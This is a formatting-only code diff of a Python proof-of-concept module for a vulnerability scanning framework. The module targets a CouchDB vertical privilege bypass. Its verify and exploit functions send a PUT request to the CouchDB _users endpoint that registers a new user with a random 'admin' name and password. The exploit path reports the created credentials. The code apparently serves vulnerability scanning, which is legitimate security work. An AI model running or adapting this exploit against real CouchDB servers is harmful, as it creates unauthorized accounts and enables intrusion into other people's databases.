@@ -5,6 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import json
 
+
 class Vuln(ABVuln):
     vuln_id = 'CouchDB_0001'  # 平台漏洞编号，留空
     name = 'CouchDB 垂直权限绕过漏洞'  # 漏洞名称
@@ -35,8 +36,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #生成随机注册信息
-            info = 'admin' + str(random.randint(1,10000))
+            # 生成随机注册信息
+            info = 'admin' + str(random.randint(1, 10000))
             headers = {
                 'Content-Type': 'application/json'
             }
@@ -47,8 +48,9 @@ class Poc(ABPoc):
                 "roles": [],
                 "password": info
             }
-            data = json.dumps(data) 
-            url = self.target + '/_users/org.couchdb.user:{admin}'.format(admin=info)
+            data = json.dumps(data)
+            url = self.target + \
+                '/_users/org.couchdb.user:{admin}'.format(admin=info)
             r = requests.put(url, data=data, headers=headers)
             if info in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -62,8 +64,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #生成随机注册信息
-            info = 'admin' + str(random.randint(1,10000))
+            # 生成随机注册信息
+            info = 'admin' + str(random.randint(1, 10000))
             headers = {
                 'Content-Type': 'application/json'
             }
@@ -74,8 +76,9 @@ class Poc(ABPoc):
                 "roles": [],
                 "password": info
             }
-            data_json = json.dumps(data_dict) 
-            url = self.target + '/_users/org.couchdb.user:{admin}'.format(admin=info)
+            data_json = json.dumps(data_dict)
+            url = self.target + \
+                '/_users/org.couchdb.user:{admin}'.format(admin=info)
             r = requests.put(url, data=data_json, headers=headers)
             if info in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册用户:{uname}，密码：{passwd},请及时删除。'.format(
@@ -83,6 +86,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
